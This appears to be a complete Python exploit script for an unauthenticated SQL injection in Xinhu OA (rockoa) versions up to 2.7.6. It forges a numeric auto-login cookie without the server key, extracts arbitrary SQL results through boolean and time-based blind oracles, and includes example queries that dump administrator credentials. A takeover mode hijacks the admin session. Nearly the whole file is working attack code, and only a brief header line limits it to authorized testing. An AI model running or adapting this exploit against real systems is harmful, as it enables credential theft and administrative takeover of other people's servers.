#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
信呼OA(xinhu/rockoa) <= V2.7.6 自动登录Cookie前台SQL注入 EXP
任意SQL查询执行(布尔通道, 自动降级时间盲注) + 管理员会话接管

注入点:
  SELECT name,token,id,uid FROM [pre]logintoken WHERE token='$INJ' LIMIT 1
  (webmain/model/loginModel.php -> autologin(), 前台免认证入口 we/index等)

回显原理(布尔通道):
  payload: zz' UNION SELECT 'x','y',9,1 FROM DUAL WHERE (<COND>)#
    条件真 -> UNION行存在 -> 建立会话 -> HTTP 200
    条件假 -> 无行 -> 跳转登录/未登录 -> HTTP 302或"没有登录"
  逐字符二分提取: ASCII(SUBSTRING((<SQL>),n,1))>k

用法:
  python3 exp.py -t http://127.0.0.1:8827 --sql "SELECT version()"
  python3 exp.py -t http://127.0.0.1:8827 --sql "SELECT GROUP_CONCAT(user) FROM xinhu_admin"
  python3 exp.py -t http://127.0.0.1:8827 --sql "SELECT CONCAT(user,'=',pass) FROM xinhu_admin WHERE id=1"
  python3 exp.py -t http://127.0.0.1:8827 --takeover

仅可用于授权测试与自建环境安全验证。
"""
import argparse
import base64
import re
import sys
import time
import urllib.request
import urllib.error

ENTRY = '/index.php?d=we&m=index'
QOM = 'xinhu_'


# ---------------- 无密钥Cookie伪造 ----------------
def _seg(ch):
    """字符 -> 十进制不含'0'的(ord+256k)编码段; 服务端chr()自动%256还原"""
    o, k = ord(ch), 0
    while True:
        v = o + 256 * k
        if '0' not in str(v):
            return str(v)
        k += 1


def forge(plaintext):
    """任意payload -> 纯数字Cookie

    目标自研jm编码的uncrypts()仅映射字母表(a-z)内字符, 数字原样直通;
    分隔符'0'与chr()%256的取模特性使得任意字符均可用纯数字表示,
    整个编码过程不涉及目标密钥(randkey)。
    """
    b = base64.b64encode(plaintext.encode()).decode()
    b = b.replace('+', '!').replace('/', '.').replace('=', ':')
    return '0'.join(_seg(c) for c in b) + '05'


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None


OP = urllib.request.build_opener(_NoRedirect())


def http(url, cookie=None, timeout=25):
    rq = urllib.request.Request(url)
    rq.add_header('X-Requested-With', 'XMLHttpRequest')
    if cookie:
        rq.add_header('Cookie', QOM + 'mo_adminid=' + cookie)
    t0 = time.time()
    try:
        r = OP.open(rq, timeout=timeout)
        st, hd, body = r.status, dict(r.headers), r.read()  # 全量读: 部分读会在查询结束前返回
    except urllib.error.HTTPError as e:
        st, hd, body = e.code, dict(e.headers), e.read()
    m = re.search(r'PHPSESSID=([0-9a-f]+)', hd.get('Set-Cookie', '') or '')
    return st, time.time() - t0, body, (m.group(1) if m else None)


# ---------------- 回显通道 ----------------
def bool_oracle(base, cond):
    """条件真->行存在->200; 假->302或'没有登录'"""
    payload = f"zz' UNION SELECT 'x','y',9,1 FROM DUAL WHERE ({cond})#"
    st, el, body, _ = http(base + ENTRY, forge(payload))
    if st in (301, 302):
        return False
    if '没有登录'.encode() in body:
        return False
    return True


def time_oracle(base, cond, th=0.7):
    payload = f"zz' UNION SELECT IF(({cond}),SLEEP(1),0),'x',9,1#"
    st, el, _, _ = http(base + ENTRY, forge(payload), timeout=15)
    return el >= th


def extract(base, sql, oracle, log=print):
    """逐字符提取标量SQL结果(二分法)"""
    out = []
    n = 1
    while n <= 4096:
        if not oracle(base, f"(SELECT LENGTH(({sql})))>={n}"):
            break
        lo, hi = 1, 127
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(base, f"ASCII(SUBSTRING(({sql}),{n},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        out.append(chr(lo))
        log('\r[*] 提取中(%d字符): %s' % (n, ''.join(out)), end='')
        n += 1
    log('')
    return ''.join(out)


def takeover(base, uid=1):
    payload = f"zz' UNION SELECT 'EXP_TEST','TOK{int(time.time())}',9,{uid}#"
    st, el, body, sess = http(base + ENTRY, forge(payload))
    return st, sess


def main():
    ap = argparse.ArgumentParser(description='信呼OA <=2.7.6 自动登录Cookie SQL注入 EXP(无密钥)')
    ap.add_argument('-t', '--target', default='http://127.0.0.1:8827')
    ap.add_argument('--qom', default='xinhu_', help='cookie前缀(webmainConfig.php中qom, 默认xinhu_)')
    ap.add_argument('--sql', help='要执行的标量SQL(单行单列); 多行结果用GROUP_CONCAT包装')
    ap.add_argument('--via', choices=['auto', 'bool', 'time'], default='auto',
                    help='回显通道(默认auto: bool歧义时自动切换time)')
    ap.add_argument('--takeover', action='store_true', help='直接接管管理员会话')
    ap.add_argument('--uid', type=int, default=1, help='接管目标uid(默认1=管理员)')
    args = ap.parse_args()

    global QOM
    QOM = args.qom
    base = args.target.rstrip('/')
    print('[*] 目标: %s  打法: 无密钥纯数字Cookie  通道: %s' % (base, args.via))

    # 通道自检(1=1/1=2判据有效性)
    oracle = time_oracle if args.via == 'time' else bool_oracle
    t0 = time.time()
    r1, r2 = oracle(base, '1=1'), oracle(base, '1=2')
    if args.via == 'auto' and not (r1 and not r2):
        print('[!] bool通道歧义(真=%s 假=%s) -> 自动切换time通道' % (r1, r2))
        oracle = time_oracle
        r1, r2 = oracle(base, '1=1'), oracle(base, '1=2')
    if not (r1 and not r2):
        print('[-] 通道自检失败(真=%s 假=%s) —— 目标可能已修复' % (r1, r2))
        sys.exit(1)
    print('[+] 通道自检通过 (真=%s, 假=%s), 探测耗时 %.2fs x2' % (r1, r2, time.time() - t0))

    if args.takeover:
        st, sess = takeover(base, args.uid)
        print('[%s] 接管: HTTP %s PHPSESSID=%s' % ('+' if sess else '-', st, sess))
        if sess:
            print('    后续: curl -b "PHPSESSID=%s" "%s/index.php?d=we&m=logn&randkey=p"' % (sess, base))
        sys.exit(0 if sess else 1)

    if not args.sql:
        ap.print_help()
        sys.exit(1)

    t0 = time.time()
    result = extract(base, args.sql, oracle)
    print('[+] SQL执行结果 (%d字符, %.1fs):' % (len(result), time.time() - t0))
    print('    ' + (result if result else '(空)'))


if __name__ == '__main__':
    main()
